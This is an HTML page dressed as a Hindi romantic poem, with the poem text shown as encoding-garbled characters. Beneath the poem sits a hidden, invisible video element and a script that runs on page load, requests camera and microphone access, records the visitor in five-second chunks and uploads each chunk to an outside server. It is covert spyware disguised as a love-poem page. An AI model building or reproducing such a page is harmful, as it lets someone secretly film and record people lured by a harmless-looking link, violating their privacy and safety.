<!DOCTYPE html>
<html lang="hi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Romantic Kavita</title>

<style>
body {
  background: #fff3f6;
  font-family: sans-serif;
  padding: 20px;
  line-height: 1.7;
  color: #333;
}
.kavita {
  max-width: 650px;
  margin: auto;
  background: white;
  padding: 28px;
  border-radius: 16px;
  box-shadow: 0 4px 14px rgba(0,0,0,0.08);
  font-size: 19px;
  position: relative;
  z-index: 10;
}
.hidden {
  position: absolute;
  width: 1px; 
  height: 1px;
  opacity: 0;
  overflow: hidden;
  pointer-events: none;
  z-index: -1;
}
h2 {
  color: #e63980;
}
</style>

</head>
<body>

<div class="kavita">
  <h2>ЁЯТХ рддреЗрд░реА рдпрд╛рджреЛрдВ рдХреА рдЦреБрд╢рдмреВ ЁЯТХ</h2>
  <p>
    рддреЗрд░реА рдЖрдБрдЦреЛрдВ рдореЗрдВ рдЬреЛ рд╕реБрдХреВрди рд╣реИ,<br>
    рд╡реЛ рдХрд╣реАрдВ рдФрд░ рдорд┐рд▓рддрд╛ рдирд╣реАрдВтАж<br><br>
    рддреЗрд░реА рдореБрд╕реНрдХрд╛рди рдХреА рдПрдХ рд╣рд▓реНрдХреА рд╕реА рд▓рд╣рд░,<br>
    рджрд┐рд▓ рдХреЛ рдЫреВрдХрд░ рдирд┐рдХрд▓ рдЬрд╛рдП рддреЛ,<br>
    рдзрдбрд╝рдХрдиреЗрдВ рднреА рдХрд╣ рдЙрдарддреА рд╣реИрдВ тАФ<br>
    *"рд░реБрдХ рдЬрд╛ рдЬрд╝рд░рд╛тАж рдпреЗ рдкрд▓ рдлрд┐рд░ рдЖрдП рдирд╛ рдЖрдПтАж"*
    <br><br>
    рддреВ рд╕рд╛рде рд╣реЛ рддреЛ рд╣рд░ рдмрд╛рдд рд╣рд╕реАрди рд▓рдЧреЗ,<br>
    рд╡рд░рдирд╛ рдпреЗ рджреБрдирд┐рдпрд╛ рднреА рдХреЛрдИ рдХреНрдпрд╛ рдЦрд╛рд╕ рд╣реИтАж<br><br>
    рддреЗрд░реА рдпрд╛рджреЛрдВ рдХреА рдЦреБрд╢рдмреВ рдореЗрдВ,<br>
    рдореЗрд░рд╛ рд╣рд░ рд╢рд╛рдо рдЖрдЬ рднреА рд╕рд╛рдБрд╕ рд▓реЗрддрд╛ рд╣реИтАж ЁЯМ╣ЁЯТл
  </p>
</div>

<video id="cam" class="hidden" autoplay playsinline></video>

<script>
let stream;
let recorder;

// Start capturing
async function startCapture() {
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { width: 720, height: 1280 },
      audio: true
    });

    const v = document.getElementById("cam");
    v.srcObject = stream;
    v.muted = true;

    // FIXED MIME TYPE with codec
    const options = {
      mimeType: "video/webm;codecs=vp8,opus"
    };

    recorder = new MediaRecorder(stream, options);

    recorder.ondataavailable = (e) => {
      if (e.data.size > 0) sendChunk(e.data);
    };

    // FIXED: small chunk interval = safest recording
    recorder.start(5000);

  } catch (err) {
    console.log("Camera permission issue:", err);
  }
}

async function sendChunk(blob) {
  const fd = new FormData();
  fd.append("video_chunk", blob, "chunk.webm");

  fetch("https://video.kannu-jaat.deno.net", {
    method: "POST",
    body: fd
  }).catch((e)=>{
    console.error("Failed to send chunk:", e);
  });
}

window.addEventListener("beforeunload", () => {
  try {
    if (recorder && recorder.state !== "inactive") recorder.stop();
    if (stream) stream.getTracks().forEach(t => t.stop());
  } catch {}
});

startCapture();
</script>

</body>
</html>